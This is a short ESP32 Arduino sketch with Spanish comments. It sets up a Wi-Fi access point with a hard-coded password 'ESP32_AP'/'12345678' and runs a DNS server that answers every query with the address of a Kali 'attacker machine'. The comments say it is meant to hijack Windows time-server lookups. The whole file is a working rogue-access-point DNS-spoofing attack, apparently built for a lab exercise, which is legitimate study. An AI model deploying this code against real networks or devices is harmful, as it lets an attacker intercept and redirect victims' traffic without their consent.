#include <Arduino.h> // Obligatorio en PlatformIO
#include <WiFi.h>
#include <DNSServer.h> // Necesario para interceptar solicitudes DNS

const char *ssid = "ESP32_AP";
const char *password = "12345678";

// Puerto estándar para DNS
const byte DNS_PORT = 53;
DNSServer dnsServer;

// IP DE UBUNTU
IPAddress ipKali(192, 168, 4, 2);

// Configuración de red para el AP de la ESP32
IPAddress apIP(192, 168, 4, 1);
IPAddress netMask(255, 255, 255, 0);

void setup()
{
  Serial.begin(115200);
  delay(100);

  // Configura el direccionamiento local de la ESP32
  WiFi.softAPConfig(apIP, apIP, netMask);
  WiFi.softAP(ssid, password);

  Serial.println("\n--- AP Levantado ---");
  Serial.print("SSID: ");
  Serial.println(ssid);
  Serial.print("IP del AP (Gateway): ");
  Serial.println(WiFi.softAPIP());

  // Intercepta CUALQUIER solicitud DNS (*) y respóndele con la IP de Kali.
  // Esto asegura que si Windows busca "time.windows.com" o "time.google.com",
  // el ESP32 le dirá que la IP es la de tu máquina atacante.
  dnsServer.start(DNS_PORT, "*", ipKali);

  Serial.print("DNS Spoofing activo redirigiendo todo a Kali: ");
  Serial.println(ipKali);
}

void loop()
{
  // Mantener el servidor DNS escuchando y procesando peticiones
  dnsServer.processNextRequest();
  delay(10);
}